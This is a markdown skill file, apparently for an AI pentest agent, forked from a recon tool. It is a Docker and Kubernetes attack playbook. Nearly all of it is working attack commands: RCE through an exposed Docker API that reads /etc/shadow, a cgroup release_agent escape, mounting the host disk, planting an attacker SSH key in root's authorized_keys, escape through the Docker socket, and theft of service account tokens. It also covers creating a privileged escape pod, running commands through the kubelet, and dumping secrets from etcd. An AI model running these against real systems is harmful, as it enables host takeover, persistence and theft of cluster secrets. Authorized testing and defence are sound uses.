<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: docker-container
description: Security testing playbook for Docker and container environments covering container escape, privileged containers, exposed Docker API, misconfigurations, and Kubernetes enumeration
---

# Docker / Container Security Testing

Containers are frequently misconfigured in production. Attack surface: exposed Docker daemon API (direct RCE), privileged container escape, mounted host paths, weak seccomp/AppArmor, and Kubernetes RBAC misconfigurations.

---

## Reconnaissance

### Discovery

    # Port scanning for Docker/container services
    nmap -p 2375,2376,4243,8080,8443,10250,10255,6443,2379 <target> -sV --open

    # Ports:
    # 2375  — Docker daemon (HTTP, no TLS — CRITICAL if exposed)
    # 2376  — Docker daemon (HTTPS with TLS)
    # 4243  — Alternate Docker daemon
    # 10250 — Kubernetes kubelet API
    # 10255 — Kubernetes kubelet read-only
    # 6443  — Kubernetes API server
    # 2379  — etcd (Kubernetes state store)

---

## Exposed Docker API (Remote Code Execution)

Docker API on port 2375 with no TLS = instant RCE:

    # Test connection
    curl http://<target>:2375/version
    curl http://<target>:2375/info

    # List containers
    curl http://<target>:2375/containers/json
    curl http://<target>:2375/containers/json?all=true

    # List images
    curl http://<target>:2375/images/json

    # RCE: Create and run a privileged container mounting host filesystem
    curl -X POST http://<target>:2375/containers/create \
      -H "Content-Type: application/json" \
      -d '{
        "Image": "alpine",
        "Cmd": ["chroot", "/host", "bash", "-c", "id && cat /etc/shadow"],
        "HostConfig": {
          "Binds": ["/:/host"],
          "Privileged": true
        }
      }' | python3 -m json.tool

    # Start the container (replace <id> with returned container ID):
    curl -X POST http://<target>:2375/containers/<id>/start

    # Get output (attach to container logs):
    curl http://<target>:2375/containers/<id>/logs?stdout=true

    # Using Docker CLI directly:
    docker -H tcp://<target>:2375 run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

---

## Container Escape Techniques

### Privileged Container Escape

    # Check if running in privileged container:
    cat /proc/1/status | grep CapEff
    # CapEff: 0000003fffffffff = full capabilities = privileged

    # Mount host filesystem via cgroup:
    mkdir /tmp/cgroup && mount -t cgroup -o memory none /tmp/cgroup
    mkdir /tmp/cgroup/x
    echo 1 > /tmp/cgroup/x/notify_on_release
    host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
    echo "$host_path/cmd" > /tmp/cgroup/release_agent
    echo "#!/bin/sh" > /cmd
    echo "id > $host_path/output" >> /cmd
    chmod a+x /cmd
    sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"
    cat /output

    # Mount host device (privileged):
    fdisk -l                        # Find host disk (usually /dev/sda1 or /dev/xvda1)
    mkdir /host
    mount /dev/sda1 /host
    cat /host/etc/shadow            # Host password hashes

    # Add SSH key to host root:
    echo "ssh-rsa AAAA... attacker" >> /host/root/.ssh/authorized_keys

### Escape via Mounted Docker Socket

    # Check if Docker socket is mounted in container:
    ls -la /var/run/docker.sock
    # If exists = full Docker control = host escape

    # Use socket to spawn host-privileged container:
    docker -H unix:///var/run/docker.sock run -it --privileged \
      --pid=host --ipc=host --net=host \
      -v /:/host alpine chroot /host

    # Or install docker client first:
    apt-get install -y docker.io || apk add docker
    docker -H unix:///var/run/docker.sock ps

### Escape via Kernel Vulnerabilities

    # Check kernel version for known exploits:
    uname -r
    # Notable container escape CVEs:
    # CVE-2022-0847 (DirtyPipe) — Kernel 5.8-5.16.11
    # CVE-2019-5736 (runc) — Overwrite runc binary
    # CVE-2019-14271 (Docker) — Shared library injection

    # runc escape (CVE-2019-5736):
    # Overwrite /proc/self/exe during exec → overwrites host runc binary
    # Tools: https://github.com/Frichetten/CVE-2019-5736-PoC

---

## Container Enumeration (From Inside)

    # Detect if inside a container
    cat /proc/1/cgroup | grep -i docker
    cat /.dockerenv                     # File exists = Docker container
    ls -la /run/.containerenv          # Podman indicator

    # Environment variables (may contain secrets)
    env | grep -iE "key|token|secret|password|pass|api|db|url"
    cat /proc/1/environ | tr '\0' '\n' | grep -iE "key|token|secret|password"

    # Mounted secrets
    find / -name "*.key" -o -name "*.pem" -o -name "secrets" 2>/dev/null
    cat /run/secrets/*                  # Docker Swarm secrets
    ls /var/run/secrets/kubernetes.io/serviceaccount/   # Kubernetes SA token

    # Network neighbors (other containers)
    ip route                           # Subnet reveals container network
    cat /etc/hosts                     # Other containers
    nmap -sn <container_subnet>/24    # Scan container network

---

## Kubernetes Attacks (From Within a Pod)

### Service Account Token Exploitation

    # Default SA token mounted at:
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

    # Query K8s API:
    curl -s https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods \
      -H "Authorization: Bearer $TOKEN" --cacert $CACERT

    # Check permissions:
    curl -s https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
      -H "Authorization: Bearer $TOKEN" --cacert $CACERT \
      -H "Content-Type: application/json" -d '
    {"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview",
     "spec":{"resourceAttributes":{"verb":"list","resource":"pods"}}}'

    # Using kubectl:
    kubectl --token=$TOKEN --certificate-authority=$CACERT \
      -s https://kubernetes.default.svc auth can-i --list

### Kubernetes Privilege Escalation

    # Create privileged pod to escape to host:
    kubectl --token=$TOKEN apply -f - <<EOF
    apiVersion: v1
    kind: Pod
    metadata:
      name: escape
    spec:
      hostPID: true
      hostNetwork: true
      containers:
      - name: escape
        image: alpine
        command: ["nsenter", "--mount=/proc/1/ns/mnt", "--", "sh"]
        securityContext:
          privileged: true
    EOF

    # Access pod:
    kubectl --token=$TOKEN exec -it escape -- sh

---

## Kubernetes External API Attacks

    # Anonymous access to Kubernetes API:
    curl -sk https://<k8s-api>:6443/api/v1/namespaces/default/pods
    curl -sk https://<k8s-api>:6443/version

    # Kubelet read-only API (port 10255):
    curl http://<node>:10255/pods          # Lists all pods (no auth!)
    curl http://<node>:10255/stats/summary

    # Kubelet API (port 10250):
    curl -sk https://<node>:10250/pods
    # Run command on pod (if anonymous allowed):
    curl -sk https://<node>:10250/run/<namespace>/<pod>/<container> \
      -d "cmd=id"

    # etcd access (port 2379):
    etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only
    etcdctl --endpoints=http://<target>:2379 get /registry/secrets --prefix
    # Contains Kubernetes secrets in base64!

---

## Docker Compose / Config File Exposure

    # Look for exposed Docker configuration:
    GET /docker-compose.yml
    GET /docker-compose.yaml
    GET /.docker/config.json      # Registry credentials!
    GET /Dockerfile

    # Registry credentials in config.json:
    cat ~/.docker/config.json
    # Contains base64-encoded registry auth credentials

---

## Container Image Analysis

    # Pull and analyze image locally:
    docker pull <image>:<tag>
    docker history <image>:<tag>      # Layer commands (may reveal secrets added then deleted)
    docker inspect <image>:<tag>      # Env vars, exposed ports, volumes

    # Extract image filesystem:
    docker save <image> | tar -xf - -C /tmp/image_layers/
    find /tmp/image_layers/ -name "*.tar" -exec tar -tf {} \; | grep -iE "password|secret|key"

    # Tools for image scanning:
    trivy image <image>:<tag>                 # CVE + secret scanning
    trufflehog docker --image <image>         # Secret scanning in image history

---

## Pro Tips

1. Docker daemon on port 2375 (no TLS) = instant host takeover — always check first
2. Mounted Docker socket (`/var/run/docker.sock`) inside a container = full host escape
3. `cat /proc/1/environ` reveals environment variables including secrets
4. Kubernetes pod default SA token + `list pods` permission → cluster-wide enumeration
5. Kubelet read-only API (port 10255) often accessible without auth — lists all pods
6. etcd on port 2379 without TLS = all Kubernetes secrets in plaintext
7. `docker history` reveals sensitive data in layers even if files were deleted in later layers

## Summary

Container testing = Docker API on 2375 (no TLS) → instant RCE + privileged container escape via `/dev/sda` mount + Docker socket mount → host escape. Inside K8s pods: service account token → API enumeration → privileged pod creation → host escape. etcd exposure is often overlooked but contains all cluster secrets in base64. Always scan the container subnet for other accessible services after initial access.
